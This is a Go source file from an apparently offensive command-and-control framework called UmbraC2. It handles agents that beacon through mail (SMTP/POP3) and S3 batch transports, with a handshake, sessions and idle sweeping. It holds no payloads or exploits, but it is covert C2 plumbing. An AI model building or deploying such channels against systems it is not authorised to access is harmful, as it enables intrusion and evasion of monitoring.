package link

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"time"

	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
	"github.com/thesyntax1/UmbraC2/server/internal/session"
	"github.com/thesyntax1/UmbraC2/server/internal/wire"
)

// The batch transports.
//
// The mail transport (SMTP out, POP3 back) and the object transport (S3) have
// no connection to keep: the agent posts a batch of frames and the server
// answers with a batch of frames.  Everything above the transport -- the
// handshake, the session state machine, the task queue -- is the same as on
// TCP, because a batch is a FrameStream like any other.
//
// The session of an agent therefore lives in the server instead of in a
// goroutine: the frames of one agent arrive in pieces (the HELLO in the
// first batch, the check-in in the second, the result in the third), and
// every piece is answered on its own.

// batchSession is the server side of one agent on a batch transport.
type batchSession struct {
	sess  *session.Session
	link  *AgentLink
	agent string
	sid   string
	seen  time.Time
}

// batchStream carries the frames of one batch.
//
// The input is a reader over the body of the batch and the output collects
// the frames the server answers with.
type batchStream struct {
	in  *bytes.Reader
	out bytes.Buffer
}

func (s *batchStream) ReadFrame() ([]byte, error) { return wire.ReadFrame(s.in) }

func (s *batchStream) WriteFrame(frame []byte) error {
	_, err := s.out.Write(frame)
	return err
}

// HandleBatch feeds a batch of frames into the session of an agent and
// returns the frames the server answers with.
//
// The first batch of an agent carries the HELLO: the handshake runs over the
// batch exactly like it runs over a socket, and the session it creates is
// kept for the batches that follow.
func (s *Server) HandleBatch(agentID, transport string, in []byte) ([]byte, error) {
	s.batchMu.Lock()
	defer s.batchMu.Unlock()
	s.sweepBatchSessions()

	bs := s.batchSessions[agentID]
	// A batch that starts with a HELLO begins a new session: the beacon
	// starts every cycle with a fresh handshake, and a batch transport
	// has no connection that would tell the two apart.
	if isHelloFrame(in) {
		if bs != nil {
			s.Hub.UnregisterSession(bs.agent, bs.sid)
		}
		delete(s.batchSessions, agentID)
		bs = nil
	}
	var out bytes.Buffer
	rest := bytes.NewReader(in)
	if bs == nil {
		stream := &batchStream{in: rest}
		log := s.Log.With("peer", agentID, "transport", transport)
		sess, info, err := Handshake(stream, s.Cfg, log, agentID)
		if err != nil {
			return nil, err
		}
		if info.Role != crypt.RoleAgent {
			return nil, errors.New("the batch transport is for agents only")
		}
		sleep, jitter := s.Cfg.Server.Beacon.Sleep, s.Cfg.Server.Beacon.Jitter
		meta := AgentMeta(info, transport, agentID, sleep, jitter)
		rec, _, err := s.Hub.RegisterAgent(meta, transport, agentID, info.Suite, info.SessionID)
		if err != nil {
			return nil, err
		}
		// The HELLO_ACK was written into the stream while the handshake
		// ran: it is the first frame of the answer.
		_, _ = out.Write(stream.out.Bytes())
		bs = &batchSession{
			sess:  sess,
			link:  &AgentLink{Hub: s.Hub, Session: sess, AgentID: rec.ID, Transport: transport, Log: s.Log},
			agent: rec.ID,
			sid:   fmt.Sprintf("%x", info.SessionID),
			seen:  time.Now(),
		}
		s.batchSessions[agentID] = bs
		// The handshake consumed the HELLO: the rest of the batch holds
		// the frames that follow it.
		rest = stream.in
	}
	bs.seen = time.Now()
	for {
		raw, err := wire.ReadFrame(rest)
		if err != nil {
			if errors.Is(err, io.EOF) {
				break
			}
			return nil, err
		}
		frames, err := bs.link.HandleFrame(raw)
		if err != nil {
			return nil, err
		}
		for _, f := range frames {
			_, _ = out.Write(f)
		}
		if bs.link.Closed() {
			s.Hub.UnregisterSession(bs.agent, bs.sid)
			delete(s.batchSessions, agentID)
			break
		}
	}
	return out.Bytes(), nil
}

// isHelloFrame reports whether a batch begins with a HELLO.
//
// The type of a frame stands in the clear in the prelude, so the server
// sees a new handshake before it tries to open one.
func isHelloFrame(batch []byte) bool {
	if len(batch) < wire.PreludeLen {
		return false
	}
	return batch[4] == wire.MsgHello
}

// BatchSessionCount is how many agents talk a batch transport.
func (s *Server) BatchSessionCount() int {
	s.batchMu.Lock()
	defer s.batchMu.Unlock()
	return len(s.batchSessions)
}

// sweepBatchSessions drops the sessions of the agents that went quiet.
//
// A batch transport has no connection that can time out, so the server keeps
// the session until the agent says goodbye or until it stops talking.
func (s *Server) sweepBatchSessions() {
	limit := time.Duration(s.Cfg.Server.Limits.IdleTimeoutSec) * time.Second
	if limit <= 0 {
		limit = 2 * time.Minute
	}
	now := time.Now()
	for id, bs := range s.batchSessions {
		if now.Sub(bs.seen) > limit {
			s.Hub.UnregisterSession(bs.agent, bs.sid)
			delete(s.batchSessions, id)
		}
	}
}
